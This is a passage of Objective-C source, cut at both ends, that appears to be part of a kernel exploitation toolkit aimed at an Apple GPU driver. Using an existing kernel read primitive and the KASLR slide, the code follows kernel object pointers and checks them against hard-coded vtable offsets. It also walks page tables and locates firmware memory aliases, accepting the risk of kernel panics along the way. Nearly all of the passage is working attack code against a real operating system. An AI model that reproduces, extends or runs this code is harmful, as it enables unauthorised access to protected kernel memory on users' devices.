        !CNDUatE1Read32(api, contextField, &stableContextID)) {
        reason = @"agx-bootstrap-context-id-read-failed";
        goto done;
    }
    bool contextPassed = contextID == 0 && stableContextID == contextID;
    report[@"agxBootstrapContextPredicate"] = @{
        @"domain": @3,
        @"domainName": @"accelerator-bootstrap",
        @"fieldAddress": CNDUatE1Hex(contextField),
        @"contextID": @(contextID),
        @"stableContextID": @(stableContextID),
        @"expectedContextID": @0,
        @"staticWriter": @"AGXAccelerator::start 0x8a7f908",
        @"passed": @(contextPassed),
    };
    CNDUatE1Persist(report);
    if (!contextPassed) {
        reason = @"agx-bootstrap-context-id-predicate-failed";
        goto done;
    }

    uint64_t readyAddress = CNDUatE1IOUATMapsReady + slide;
    CNDUatE1Progress(report, @"agx-bootstrap.ttbat",
                     @"read-maps-ready", readyAddress);
    uint8_t ready = 0;
    if (!CNDUatE1Read8(api, readyAddress, &ready) || ready != 2) {
        report[@"ttbatMapsReady"] = @(ready);
        reason = @"agx-bootstrap-ttbat-maps-not-ready";
        goto done;
    }

    uint64_t mapSlotAddress = CNDUatE1TTBATMapVA + slide;
    CNDUatE1Progress(report, @"agx-bootstrap.ttbat",
                     @"read-retained-map-va", mapSlotAddress);
    uint64_t ttbatRaw = 0;
    if (!CNDUatE1Read64(api, mapSlotAddress, &ttbatRaw)) {
        reason = @"agx-bootstrap-ttbat-map-read-failed";
        goto done;
    }
    uint64_t ttbat = CNDUatE1CanonicalPointer(api, ttbatRaw);
    bool ttbatPassed = ttbatRaw == ttbat && ttbat != 0 &&
        (ttbat & (CNDUatE1PageSize - 1)) == 0;
    report[@"agxBootstrapTTBATMapPredicate"] = @{
        @"slotAddress": CNDUatE1Hex(mapSlotAddress),
        @"raw": CNDUatE1Hex(ttbatRaw),
        @"canonical": CNDUatE1Hex(ttbat),
        @"aligned16K": @((ttbat & (CNDUatE1PageSize - 1)) == 0),
        @"staticLifetimeWitness":
            @"C26-E1-TTBAT-EL1-MAP-LIFETIME-TRACE-20261105",
        @"passed": @(ttbatPassed),
    };
    CNDUatE1Persist(report);
    if (!ttbatPassed) {
        reason = @"agx-bootstrap-ttbat-map-predicate-failed";
        goto done;
    }

    CNDUatE1TTBATSnapshot first = {0};
    if (!CNDUatE1SnapshotTTBAT(
            report, api, @"agx-bootstrap.ttbat-first", ttbat,
            &first, &firstSummary)) {
        reason = @"agx-bootstrap-ttbat-first-snapshot-failed";
        goto done;
    }
    uint64_t root0Word = first.words[0];
    uint64_t root1Word = first.words[1];
    uint64_t root0 = root0Word & CNDUatE1TTBATPaddrMask;
    uint64_t root1 = root1Word & CNDUatE1TTBATPaddrMask;
    bool rootsPassed =
        (root0Word & 1) != 0 && (root1Word & 1) != 0 &&
        (root0Word & ~CNDUatE1TTBATAllowedMask) == 0 &&
        (root1Word & ~CNDUatE1TTBATAllowedMask) == 0 &&
        ((root0Word & CNDUatE1TTBATContextMask) >> 48) == contextID &&
        ((root1Word & CNDUatE1TTBATContextMask) >> 48) == contextID &&
        root0 != 0 && root1 != 0 &&
        (root0 & (CNDUatE1PageSize - 1)) == 0 &&
        (root1 & (CNDUatE1PageSize - 1)) == 0;
    report[@"agxBootstrapContextRootAssociation"] = @{
        @"contextID": @(contextID),
        @"root0Word": CNDUatE1Hex(root0Word),
        @"root1Word": CNDUatE1Hex(root1Word),
        @"root0Physical": CNDUatE1Hex(root0),
        @"root1Physical": CNDUatE1Hex(root1),
        @"rootPagesRead": @NO,
        @"rootMappednessClaimed": @NO,
        @"passed": @(rootsPassed),
    };
    report[@"agxBootstrapTTBATFirstSnapshot"] = firstSummary ?: @{};
    CNDUatE1Persist(report);
    if (!rootsPassed) {
        reason = @"agx-bootstrap-context0-root-pair-predicate-failed";
        goto done;
    }

    uint64_t stableGartRaw = 0;
    uint32_t finalContextID = UINT32_MAX;
    CNDUatE1TTBATSnapshot final = {0};
    bool stabilityPassed =
        CNDUatE2ReadStable64(api, gartField, &stableGartRaw) &&
        stableGartRaw == gartRaw &&
        CNDUatE1Read32(api, contextField, &finalContextID) &&
        finalContextID == contextID &&
        CNDUatE1SnapshotTTBAT(
            report, api, @"agx-bootstrap.ttbat-final", ttbat,
            &final, &finalSummary) &&
        final.words[0] == root0Word && final.words[1] == root1Word;
    report[@"agxBootstrapAssociationStabilityPredicate"] = @{
        @"expectedGart": CNDUatE1Hex(gartRaw),
        @"observedGart": CNDUatE1Hex(stableGartRaw),
        @"expectedContextID": @(contextID),
        @"observedContextID": @(finalContextID),
        @"root0Stable": @(final.words[0] == root0Word),
        @"root1Stable": @(final.words[1] == root1Word),
        @"passed": @(stabilityPassed),
    };
    report[@"agxBootstrapTTBATFinalSnapshot"] = finalSummary ?: @{};
    CNDUatE1Persist(report);
    if (!stabilityPassed) {
        reason = @"agx-bootstrap-association-stability-failed";
        goto done;
    }

    report[@"agxBootstrapRootAssociationGateReached"] = @YES;
    report[@"tableReached"] = @YES;
    report[@"changedEntryCount"] = @0;
    report[@"kernelWriteUsed"] = @NO;
    report[@"kernelWriteCount"] = @0;
    reason = @"validated-bootstrap-gart-context0-root-pair-no-table-walk";
    CNDUatE1Persist(report);

done:
    if (reasonOut != NULL) *reasonOut = reason;
    report[@"agxBootstrapRootResult"] = reason;
    CNDUatE1Persist(report);
    return [report[@"agxBootstrapRootAssociationGateReached"] boolValue];
}

static bool CNDUatAGXReadOSArrayMetadata(
    NSMutableDictionary<NSString *, id> *report, const CNDUatE1API *api,
    NSString *hop, NSString *reportKey, uint64_t array,
    CNDUatAGXOSArrayMetadata *metadata)
{
    if (metadata == NULL) return false;
    memset(metadata, 0, sizeof(*metadata));
    uint32_t count0 = 0, count1 = 0, capacity0 = 0, capacity1 = 0;
    uint64_t backing0 = 0, backing1 = 0;
    CNDUatE1Progress(report, hop, @"read-stable-osarray-metadata",
                     array + CNDUatAGXOSArrayCount);
    bool readsPassed =
        CNDUatE1Read32(api, array + CNDUatAGXOSArrayCount, &count0) &&
        CNDUatE1Read32(api, array + CNDUatAGXOSArrayCapacity, &capacity0) &&
        CNDUatE1Read64(api, array + CNDUatAGXOSArrayBacking, &backing0) &&
        CNDUatE1Read32(api, array + CNDUatAGXOSArrayCount, &count1) &&
        CNDUatE1Read32(api, array + CNDUatAGXOSArrayCapacity, &capacity1) &&
        CNDUatE1Read64(api, array + CNDUatAGXOSArrayBacking, &backing1);
    uint64_t backing = readsPassed
        ? CNDUatE1CanonicalPointer(api, backing0) : 0;
    bool stable = readsPassed && count0 == count1 &&
        capacity0 == capacity1 && backing0 == backing1;
    bool countBounded = count0 >= 1 &&
        count0 <= CNDUatAGXRTBuddyMaximumSegments;
    bool capacityBounded = capacity0 >= count0 &&
        capacity0 <= CNDUatAGXRTBuddyMaximumCapacity;
    bool backingShape = backing != 0 && (backing & 0x7) == 0;
    bool passed = stable && countBounded && capacityBounded && backingShape;
    report[reportKey] = @{
        @"array": CNDUatE1Hex(array),
        @"count": @(count0),
        @"stableCount": @(count1),
        @"capacity": @(capacity0),
        @"stableCapacity": @(capacity1),
        @"rawBacking": CNDUatE1Hex(backing0),
        @"stableRawBacking": CNDUatE1Hex(backing1),
        @"strippedBacking": CNDUatE1Hex(backing),
        @"stable": @(stable),
        @"countWithinProbeCap1To8": @(countBounded),
        @"capacityWithinProbeCap": @(capacityBounded),
        @"backingAligned8": @(backingShape),
        @"kernelPACValidated": @NO,
        @"backingMappednessClaimedBeforeRead": @NO,
        @"explicitPanicRiskAccepted": @YES,
        @"passed": @(passed),
    };
    CNDUatE1Persist(report);
    if (!passed) return false;
    metadata->count = count0;
    metadata->capacity = capacity0;
    metadata->rawBacking = backing0;
    metadata->backing = backing;
    return true;
}

static bool CNDUatAGXRunRTBuddyAliasRoute(
    NSMutableDictionary<NSString *, id> *report, const CNDUatE1API *api,
    uint64_t slide, uint64_t accelerator, NSString **reasonOut)
{
    if (reasonOut != NULL) *reasonOut = nil;
    NSString *reason = @"agx-rtbuddy-alias-unknown";
    NSMutableArray *segmentReports = nil;
    CNDUatAGXOSArrayMetadata segmentMetadata = {0};
    CNDUatAGXOSArrayMetadata cpuMapMetadata = {0};
    uint64_t segmentElements[CNDUatAGXRTBuddyMaximumSegments] = {0};
    uint64_t firmwareRaw = 0, channelRaw = 0, rtBuddyRaw = 0;
    uint64_t rtFirmwareRaw = 0, coredumpRaw = 0;
    uint64_t segmentArrayRaw = 0, cpuMapArrayRaw = 0;
    uint64_t firmware = 0, channel = 0, rtBuddy = 0;
    uint64_t rtFirmware = 0, coredump = 0;
    uint64_t segmentArray = 0, cpuMapArray = 0;
    uint64_t coveringGPUBase = 0, coveringLength = 0;
    NSUInteger coveringIndex = NSNotFound;

    report[@"agxRTBuddyAliasGateReached"] = @NO;
    report[@"targetFirmwareOutputTableVA"] =
        CNDUatE1Hex(CNDUatAGXFirmwareOutputTableVA);
    report[@"targetFirmwareOutputFieldOffset"] =
        CNDUatE1Hex(CNDUatAGXFirmwareOutputFieldOffset);
    report[@"osArrayBackingPACValidated"] = @NO;
    report[@"osArrayBackingRiskExplicitlyAccepted"] = @YES;
    report[@"segmentBackingReadAttempted"] = @NO;
    report[@"cpuMapBackingReadAttempted"] = @NO;
    report[@"firmwareOutputReadAttempted"] = @NO;
    report[@"kernelWriteUsed"] = @NO;
    report[@"kernelWriteCount"] = @0;
    CNDUatE1Persist(report);

    uint64_t firmwareField =
        accelerator + CNDUatAGXAcceleratorFirmwareASC;
    CNDUatE1Progress(report, @"agx-rtbuddy.firmware-manager",
                     @"read-stable-accelerator-firmware-manager",
                     firmwareField);
    if (!CNDUatE2ReadStable64(api, firmwareField, &firmwareRaw)) {
        reason = @"agx-rtbuddy-firmware-manager-read-or-stability-failed";
        goto done;
    }
    firmware = CNDUatE1CanonicalPointer(api, firmwareRaw);
    report[@"agxFirmwareManager"] = CNDUatE1PointerReport(api, firmwareRaw);
    CNDUatE1Persist(report);
    if (firmware == 0 || (firmware & 0x7) != 0 ||
        !CNDUatE1ValidateLifecycleVptr(
            report, api, @"agx-rtbuddy.firmware-manager", firmware,
            CNDUatAGXArmFirmwareASCVtable, slide,
            @"AGXAccelerator::start 0x8a7eed0 stores the metaclass-allocated "
             "AGXArmFirmwareASC at accelerator+0x548; constructor "
             "0x8aecc34..0x8aecc4c installs the exact instance vtable",
            NULL)) {
        reason = @"agx-rtbuddy-firmware-manager-vptr-predicate-failed";
        goto done;
    }

    uint64_t channelField = firmware + CNDUatAGXFirmwareChannel0;
    CNDUatE1Progress(report, @"agx-rtbuddy.channel0",
                     @"read-stable-firmware-channel-slot0", channelField);
    if (!CNDUatE2ReadStable64(api, channelField, &channelRaw)) {
        reason = @"agx-rtbuddy-channel0-read-or-stability-failed";
        goto done;
    }
    channel = CNDUatE1CanonicalPointer(api, channelRaw);
    report[@"agxFirmwareChannel0"] = CNDUatE1PointerReport(api, channelRaw);
    CNDUatE1Persist(report);
    if (channel == 0 || (channel & 0x7) != 0 ||
        !CNDUatE1ValidateLifecycleVptrEither(
            report, api, @"agx-rtbuddy.channel0", channel,
            CNDUatAGXFirmwareChannelVtable0,
            CNDUatAGXFirmwareChannelVtable1, slide,
            @"firmware channel registration 0x8ae2dc0 stores the raw "
             "channel at firmware+0x17f0+0x38*index; kick uses slot 0")) {
        reason = @"agx-rtbuddy-channel0-vptr-predicate-failed";
        goto done;
    }

    uint64_t rtBuddyField = channel + CNDUatAGXChannelRTBuddy;
    CNDUatE1Progress(report, @"agx-rtbuddy.provider",
                     @"read-stable-channel-rtbuddy-provider", rtBuddyField);
    if (!CNDUatE2ReadStable64(api, rtBuddyField, &rtBuddyRaw)) {
        reason = @"agx-rtbuddy-provider-read-or-stability-failed";
        goto done;
    }
    rtBuddy = CNDUatE1CanonicalPointer(api, rtBuddyRaw);
    report[@"agxRTBuddy"] = CNDUatE1PointerReport(api, rtBuddyRaw);
    CNDUatE1Persist(report);
    if (rtBuddy == 0 || (rtBuddy & 0x7) != 0 ||
        !CNDUatE1ValidateLifecycleVptr(
            report, api, @"agx-rtbuddy.provider", rtBuddy,
            CNDUatAGXRTBuddyVtable, slide,
            @"channel startup 0x8a6a7d4..0x8a6a828 OSDynamicCasts its "
             "provider to RTBuddyService and stores it at channel+0x128",
            NULL)) {
        reason = @"agx-rtbuddy-provider-vptr-predicate-failed";
        goto done;
    }

    uint64_t rtFirmwareField = rtBuddy + CNDUatAGXRTBuddyFirmware;
    CNDUatE1Progress(report, @"agx-rtbuddy.loaded-firmware",
                     @"read-stable-rtbuddy-firmware", rtFirmwareField);
    if (!CNDUatE2ReadStable64(api, rtFirmwareField, &rtFirmwareRaw)) {
        reason = @"agx-rtbuddy-loaded-firmware-read-or-stability-failed";
        goto done;
    }
    rtFirmware = CNDUatE1CanonicalPointer(api, rtFirmwareRaw);
    report[@"agxRTBuddyFirmware"] =
        CNDUatE1PointerReport(api, rtFirmwareRaw);
    CNDUatE1Persist(report);
    if (rtFirmware == 0 || (rtFirmware & 0x7) != 0 ||
        !CNDUatE1ValidateLifecycleVptr(
            report, api, @"agx-rtbuddy.loaded-firmware", rtFirmware,
            CNDUatAGXRTBuddyFirmwareVtable, slide,
            @"RTBuddy phase-1 load 0xad21874..0xad218dc retains the loaded "
             "RTBuddyFirmware at RTBuddy+0x21e0; +0x21e8 is management",
            NULL)) {
        reason = @"agx-rtbuddy-loaded-firmware-vptr-predicate-failed";
        goto done;
    }

    uint64_t coredumpField =
        rtFirmware + CNDUatAGXRTBuddyCoredumpMap;
    CNDUatE1Progress(report, @"agx-rtbuddy.coredump-map",
                     @"read-stable-firmware-coredump-map", coredumpField);
    if (!CNDUatE2ReadStable64(api, coredumpField, &coredumpRaw)) {
        reason = @"agx-rtbuddy-coredump-map-read-or-stability-failed";
        goto done;
    }
    coredump = CNDUatE1CanonicalPointer(api, coredumpRaw);
    report[@"agxRTBuddyCoredumpMap"] =
        CNDUatE1PointerReport(api, coredumpRaw);
    CNDUatE1Persist(report);
    if (coredump == 0) {
        reason = @"agx-rtbuddy-coredump-map-not-present";
        goto done;
    }
    if ((coredump & 0x7) != 0 || !CNDUatE1ValidateLifecycleVptr(
            report, api, @"agx-rtbuddy.coredump-map", coredump,
            CNDUatAGXRTBuddyCoredumpMapVtable, slide,
            @"RTBuddyFirmware coredump builder 0xad33214 selects +0xa0 "
             "or +0x98 and 0xad33b54..0xad33b60 publishes the retained "
             "RTBuddyCoredumpMap at firmware+0xa8", NULL)) {
        reason = @"agx-rtbuddy-coredump-map-vptr-predicate-failed";
        goto done;
    }

    uint64_t segmentArrayField =
        coredump + CNDUatAGXCoredumpSegments;
    uint64_t cpuMapArrayField =
        coredump + CNDUatAGXCoredumpCPUMaps;
    CNDUatE1Progress(report, @"agx-rtbuddy.collections",
                     @"read-stable-paired-osarrays", segmentArrayField);
    if (!CNDUatE2ReadStable64(api, segmentArrayField, &segmentArrayRaw) ||
        !CNDUatE2ReadStable64(api, cpuMapArrayField, &cpuMapArrayRaw)) {
        reason = @"agx-rtbuddy-array-pointer-read-or-stability-failed";
        goto done;
    }
    segmentArray = CNDUatE1CanonicalPointer(api, segmentArrayRaw);
    cpuMapArray = CNDUatE1CanonicalPointer(api, cpuMapArrayRaw);
    report[@"agxRTBuddySegmentArray"] =
        CNDUatE1PointerReport(api, segmentArrayRaw);
    report[@"agxRTBuddyCPUMapArray"] =
        CNDUatE1PointerReport(api, cpuMapArrayRaw);
    CNDUatE1Persist(report);
    if (segmentArray == 0 || cpuMapArray == 0 ||
        (segmentArray & 0x7) != 0 || (cpuMapArray & 0x7) != 0 ||
        !CNDUatE1ValidateLifecycleVptr(
            report, api, @"agx-rtbuddy.segment-array", segmentArray,
            CNDUatAGXOSArrayVtable, slide,
            @"RTBuddyCoredumpMap constructor retains the segment OSArray "
             "at map+0x20; exact OSArray instance vtable/getObject path",
            NULL) ||
        !CNDUatE1ValidateLifecycleVptr(
            report, api, @"agx-rtbuddy.cpu-map-array", cpuMapArray,
            CNDUatAGXOSArrayVtable, slide,
            @"RTBuddyCoredumpMap constructor retains the paired CPU-map "
             "OSArray at map+0x28; exact OSArray instance vtable/getObject path",
            NULL)) {
        reason = @"agx-rtbuddy-array-vptr-predicate-failed";
        goto done;
    }

    if (!CNDUatAGXReadOSArrayMetadata(
            report, api, @"agx-rtbuddy.segment-array-metadata",
            @"agxRTBuddySegmentArrayMetadata", segmentArray,
            &segmentMetadata) ||
        !CNDUatAGXReadOSArrayMetadata(
            report, api, @"agx-rtbuddy.cpu-map-array-metadata",
            @"agxRTBuddyCPUMapArrayMetadata", cpuMapArray,
            &cpuMapMetadata)) {
        reason = @"agx-rtbuddy-array-metadata-predicate-failed";
        goto done;
    }
    if (segmentMetadata.count != cpuMapMetadata.count) {
        report[@"agxRTBuddyPairedArrayCountPredicate"] = @{
            @"segmentCount": @(segmentMetadata.count),
            @"cpuMapCount": @(cpuMapMetadata.count),
            @"passed": @NO,
        };
        reason = @"agx-rtbuddy-paired-array-count-mismatch";
        goto done;
    }
    report[@"agxRTBuddyPairedArrayCountPredicate"] = @{
        @"segmentCount": @(segmentMetadata.count),
        @"cpuMapCount": @(cpuMapMetadata.count),
        @"passed": @YES,
    };
    report[@"segmentBackingReadAttempted"] = @YES;
    report[@"firstExplicitPanicRiskAddress"] =
        CNDUatE1Hex(segmentMetadata.backing);
    CNDUatE1Progress(report, @"agx-rtbuddy.segment-elements",
                     @"explicit-panic-risk-bounded-backing-read",
                     segmentMetadata.backing);
    size_t segmentBytes =
        (size_t)segmentMetadata.count * sizeof(segmentElements[0]);
    if (!CNDUatE1Read(api, segmentMetadata.backing,
                      segmentElements, segmentBytes)) {
        reason = @"agx-rtbuddy-segment-backing-read-failed";
        goto done;
    }
    report[@"segmentBackingReadCompleted"] = @YES;
    segmentReports = [NSMutableArray array];
    for (NSUInteger index = 0; index < segmentMetadata.count; index++) {
        uint64_t segmentRaw = segmentElements[index];
        uint64_t segment = CNDUatE1CanonicalPointer(api, segmentRaw);
        NSMutableDictionary *entry = [@{
            @"index": @(index),
            @"pointer": CNDUatE1PointerReport(api, segmentRaw),
        } mutableCopy];
        [segmentReports addObject:entry];
        report[@"agxRTBuddySegments"] = segmentReports;
        CNDUatE1Persist(report);
        NSString *hop = [NSString stringWithFormat:
            @"agx-rtbuddy.segment.%lu", (unsigned long)index];
        if (segment == 0 || (segment & 0x7) != 0 ||
            !CNDUatE1ValidateLifecycleVptr(
                report, api, hop, segment,
                CNDUatAGXRTBuddySegmentVtable, slide,
                @"RTBuddySegment constructor 0xad1c250 installs exact "
                 "vtable; coredump range helper 0xad1c990 consumes "
                 "segment+0x28 GPU base and +0x30 length", NULL)) {
            entry[@"result"] = @"segment-vptr-predicate-failed";
            reason = @"agx-rtbuddy-segment-vptr-predicate-failed";
            goto done;
        }
        uint64_t gpuBase = 0, gpuLength = 0;
        if (!CNDUatE2ReadStable64(
                api, segment + CNDUatAGXRTBuddySegmentGPUBase, &gpuBase) ||
            !CNDUatE2ReadStable64(
                api, segment + CNDUatAGXRTBuddySegmentLength, &gpuLength)) {
            entry[@"result"] = @"segment-range-read-or-stability-failed";
            reason = @"agx-rtbuddy-segment-range-read-or-stability-failed";
            goto done;
        }
        bool covers = gpuLength >=
                CNDUatAGXFirmwareOutputFieldOffset + sizeof(uint32_t) &&
            CNDUatAGXFirmwareOutputTableVA >= gpuBase &&
            CNDUatAGXFirmwareOutputTableVA - gpuBase <=
                gpuLength -
                    (CNDUatAGXFirmwareOutputFieldOffset + sizeof(uint32_t));
        entry[@"gpuBase"] = CNDUatE1Hex(gpuBase);
        entry[@"length"] = CNDUatE1Hex(gpuLength);
        entry[@"coversTargetOutputField"] = @(covers);
        entry[@"result"] = covers ? @"covering-segment" : @"not-covering";
        CNDUatE1Persist(report);
        if (covers && coveringIndex == NSNotFound) {
            coveringIndex = index;
            coveringGPUBase = gpuBase;
            coveringLength = gpuLength;
        }
    }
    if (coveringIndex == NSNotFound) {
        reason = @"agx-rtbuddy-no-segment-covers-firmware-output";
        goto done;
    }
    report[@"agxRTBuddyCoveringSegment"] = @{
        @"index": @(coveringIndex),
        @"gpuBase": CNDUatE1Hex(coveringGPUBase),
        @"length": CNDUatE1Hex(coveringLength),
    };

    if (coveringIndex >
        (UINT64_MAX - cpuMapMetadata.backing) / sizeof(uint64_t)) {
        reason = @"agx-rtbuddy-cpu-map-element-address-overflow";
        goto done;
    }
    uint64_t cpuMapElementAddress = cpuMapMetadata.backing +
        (uint64_t)coveringIndex * sizeof(uint64_t);
    report[@"cpuMapBackingReadAttempted"] = @YES;
    report[@"secondExplicitPanicRiskAddress"] =
        CNDUatE1Hex(cpuMapElementAddress);
    CNDUatE1Progress(report, @"agx-rtbuddy.cpu-map-element",
                     @"explicit-panic-risk-one-paired-element-read",
                     cpuMapElementAddress);
    uint64_t cpuMapRaw = 0;
    if (!CNDUatE1Read64(api, cpuMapElementAddress, &cpuMapRaw)) {
        reason = @"agx-rtbuddy-cpu-map-element-read-failed";
        goto done;
    }
    uint64_t cpuMap = CNDUatE1CanonicalPointer(api, cpuMapRaw);
    report[@"agxRTBuddyPairedCPUMap"] = @{
        @"index": @(coveringIndex),
        @"elementAddress": CNDUatE1Hex(cpuMapElementAddress),
        @"pointer": CNDUatE1PointerReport(api, cpuMapRaw),
    };
    CNDUatE1Persist(report);
    if (cpuMap == 0 || (cpuMap & 0x7) != 0 ||
        !CNDUatE1ValidateLifecycleVptr(
            report, api, @"agx-rtbuddy.paired-cpu-map", cpuMap,
            CNDUatAGXIOMemoryMapVtable, slide,
            @"RTBuddy coredump conversion selects the same index from "
             "map+0x28 and consumes an exact retained IOMemoryMap",
            NULL)) {
        reason = @"agx-rtbuddy-cpu-map-vptr-predicate-failed";
        goto done;
    }
    uint64_t cpuVARaw = 0, cpuLength = 0;
    if (!CNDUatE2ReadStable64(
            api, cpuMap + CNDUatAGXIOMemoryMapCPUVA, &cpuVARaw) ||
        !CNDUatE2ReadStable64(
            api, cpuMap + CNDUatAGXIOMemoryMapLength, &cpuLength)) {
        reason = @"agx-rtbuddy-cpu-map-range-read-or-stability-failed";
        goto done;
    }
    uint64_t cpuVA = CNDUatE1CanonicalPointer(api, cpuVARaw);
    uint64_t gpuOffset = CNDUatAGXFirmwareOutputTableVA - coveringGPUBase;
    bool cpuRangePassed = cpuVA != 0 && (cpuVA & 0x3) == 0 &&
        cpuLength >= CNDUatAGXFirmwareOutputFieldOffset + sizeof(uint32_t) &&
        gpuOffset <= cpuLength -
            (CNDUatAGXFirmwareOutputFieldOffset + sizeof(uint32_t)) &&
        gpuOffset <= UINT64_MAX - cpuVA &&
        CNDUatAGXFirmwareOutputFieldOffset <=
            UINT64_MAX - (cpuVA + gpuOffset);
    uint64_t outputAlias = cpuRangePassed ? cpuVA + gpuOffset : 0;
    uint64_t outputField = cpuRangePassed
        ? outputAlias + CNDUatAGXFirmwareOutputFieldOffset : 0;
    report[@"agxRTBuddyCPUAliasPredicate"] = @{
        @"rawCPUVA": CNDUatE1Hex(cpuVARaw),
        @"cpuVA": CNDUatE1Hex(cpuVA),
        @"cpuLength": CNDUatE1Hex(cpuLength),
        @"gpuOffset": CNDUatE1Hex(gpuOffset),
        @"outputAlias": CNDUatE1Hex(outputAlias),
        @"outputField": CNDUatE1Hex(outputField),
        @"passed": @(cpuRangePassed),
    };
    CNDUatE1Persist(report);
    if (!cpuRangePassed) {
        reason = @"agx-rtbuddy-cpu-map-range-predicate-failed";
        goto done;
    }

    report[@"firmwareOutputReadAttempted"] = @YES;
    CNDUatE1Progress(report, @"agx-rtbuddy.output",
                     @"read-command20-index0-output-word", outputField);
    uint32_t outputWord = 0;
    if (!CNDUatE1Read32(api, outputField, &outputWord)) {
        reason = @"agx-rtbuddy-firmware-output-read-failed";
        goto done;
    }
    report[@"agxRTBuddyFirmwareOutput"] = @{
        @"tableGPUVA": CNDUatE1Hex(CNDUatAGXFirmwareOutputTableVA),
        @"recordIndex": @0,
        @"fieldOffset": CNDUatE1Hex(CNDUatAGXFirmwareOutputFieldOffset),
        @"cpuAddress": CNDUatE1Hex(outputField),
        @"word": [NSString stringWithFormat:@"0x%08x", outputWord],
        @"command20InvokedByProbe": @NO,
        @"contentMeaningClaimed": @NO,
        @"readPassed": @YES,
    };
    report[@"agxRTBuddyAliasGateReached"] = @YES;
    report[@"tableReached"] = @YES;
    report[@"changedEntryCount"] = @0;
    reason = @"validated-rtbuddy-segment-cpu-map-output-read";
    CNDUatE1Persist(report);

done:
    if (reasonOut != NULL) *reasonOut = reason;
    report[@"agxRTBuddyAliasResult"] = reason;
    report[@"kernelWriteUsed"] = @NO;
    report[@"kernelWriteCount"] = @0;
    CNDUatE1Persist(report);
    return [report[@"agxRTBuddyAliasGateReached"] boolValue];
}

static bool CNDUatE2TranslateContiguousPages(
    const CNDUatE1API *api, const CNDUatE2CheckedWalker *walker,
    uint64_t base, NSUInteger count, CNDUatE2ReuseTranslation *translations,
    NSUInteger *checkedReadCallsOut, const char **reasonOut)
{
    if (checkedReadCallsOut != NULL) *checkedReadCallsOut = 0;
    if (reasonOut != NULL) *reasonOut = NULL;
    if (api == NULL || walker == NULL || translations == NULL || count == 0 ||
        count > CNDUatE2TranslationMaximumPages ||
        (base & (CNDUatE1PageSize - 1)) != 0 ||
        (count - 1) > (UINT64_MAX - base) / CNDUatE1PageSize) {
        if (reasonOut != NULL) *reasonOut = "invalid-translation-batch";
        return false;
    }
    NSUInteger calls = 0;
    uint64_t last = base + (count - 1) * CNDUatE1PageSize;
    CNDUatE2PageTableLevel l1Info = walker->levels[1];
    CNDUatE2PageTableLevel l2Info = walker->levels[2];
    CNDUatE2PageTableLevel l3Info = walker->levels[3];
    uint64_t l1Index = (base & l1Info.indexMask) >> l1Info.shift;
    uint64_t lastL1Index = (last & l1Info.indexMask) >> l1Info.shift;
    if (l1Index != lastL1Index ||
        l1Index > (UINT64_MAX - walker->rootTable) / sizeof(uint64_t)) {
        if (reasonOut != NULL) *reasonOut = "batch-crosses-l1-boundary";
        return false;
    }
    uint64_t l1Address = walker->rootTable + l1Index * sizeof(uint64_t);
    uint64_t l1Entry = 0;
    if (!CNDUatE1Read64(api, l1Address, &l1Entry)) {
        if (reasonOut != NULL) *reasonOut = "l1-entry-read-failed";
        return false;
    }
    calls++;
    if ((l1Entry & l1Info.validMask) != l1Info.validMask ||
        (l1Entry & l1Info.typeMask) == l1Info.typeBlock) {
        if (reasonOut != NULL) *reasonOut = "l1-entry-predicate-failed";
        return false;
    }
    uint64_t l2Physical = l1Entry & CNDUatE2TTAddressMask;
    uint64_t l2Table = 0;
    if (l2Physical == 0 ||
        (l2Physical & (CNDUatE1PageSize - 1)) != 0 ||
        !CNDUatE2PhysicalToKernelVirtual(walker, l2Physical, &l2Table)) {
        if (reasonOut != NULL) *reasonOut = "l2-table-unmappable";
        return false;
    }

    NSUInteger pageIndex = 0;
    while (pageIndex < count) {
        uint64_t groupBase = base + pageIndex * CNDUatE1PageSize;
        uint64_t l2Index = (groupBase & l2Info.indexMask) >> l2Info.shift;
        NSUInteger groupEnd = pageIndex + 1;
        while (groupEnd < count) {
            uint64_t address = base + groupEnd * CNDUatE1PageSize;
            uint64_t index = (address & l2Info.indexMask) >> l2Info.shift;
            if (index != l2Index) break;
            groupEnd++;
        }
        if (l2Index > (UINT64_MAX - l2Table) / sizeof(uint64_t)) {
            if (reasonOut != NULL) *reasonOut = "l2-entry-address-overflow";
            return false;
        }
        uint64_t l2Address = l2Table + l2Index * sizeof(uint64_t);
        uint64_t l2Entry = 0;
        if (!CNDUatE1Read64(api, l2Address, &l2Entry)) {
            if (reasonOut != NULL) *reasonOut = "l2-entry-read-failed";
            return false;
        }
        calls++;
        if ((l2Entry & l2Info.validMask) != l2Info.validMask ||
            (l2Entry & l2Info.typeMask) == l2Info.typeBlock) {
            if (reasonOut != NULL) *reasonOut = "l2-entry-predicate-failed";
            return false;
        }
        uint64_t l3Physical = l2Entry & CNDUatE2TTAddressMask;
        uint64_t l3Table = 0;
        if (l3Physical == 0 ||
            (l3Physical & (CNDUatE1PageSize - 1)) != 0 ||
            !CNDUatE2PhysicalToKernelVirtual(walker, l3Physical, &l3Table)) {
            if (reasonOut != NULL) *reasonOut = "l3-table-unmappable";
            return false;
        }

        uint64_t firstLeafIndex =
            (groupBase & l3Info.indexMask) >> l3Info.shift;
        uint64_t groupLast = base + (groupEnd - 1) * CNDUatE1PageSize;
        uint64_t lastLeafIndex =
            (groupLast & l3Info.indexMask) >> l3Info.shift;
        NSUInteger groupCount = groupEnd - pageIndex;
        if (groupCount == 0 ||
            groupCount > CNDUatE2TranslationLeafMaximumEntries ||
            lastLeafIndex < firstLeafIndex ||
            lastLeafIndex - firstLeafIndex + 1 != groupCount ||
            firstLeafIndex >
                (UINT64_MAX - l3Table) / sizeof(uint64_t)) {
            if (reasonOut != NULL) *reasonOut = "l3-leaf-span-invalid";
            return false;
        }
        uint64_t leafAddress =
            l3Table + firstLeafIndex * sizeof(uint64_t);
        // A group is bounded by one L3 table, independently of the full
        // capture size.  Keeping only that table's entries on the stack
        // avoids coupling the probe thread's stack use to the pressure bound.
        uint64_t leafEntries[CNDUatE2TranslationLeafMaximumEntries] = {0};
        uint64_t stableEntries[CNDUatE2TranslationLeafMaximumEntries] = {0};
        size_t leafBytes = groupCount * sizeof(uint64_t);
        if (!CNDUatE1Read(api, leafAddress, leafEntries, leafBytes)) {
            if (reasonOut != NULL) *reasonOut = "l3-leaf-span-read-failed";
            return false;
        }
        calls++;
        for (NSUInteger offset = 0; offset < groupCount; offset++) {
            uint64_t entry = leafEntries[offset];
            if ((entry & l3Info.validMask) != l3Info.validMask ||
                (entry & l3Info.typeMask) != l3Info.typeBlock) {
